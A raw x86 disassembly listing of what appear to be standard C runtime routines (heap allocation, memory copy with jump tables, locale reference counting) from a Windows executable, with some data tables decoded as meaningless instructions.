  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
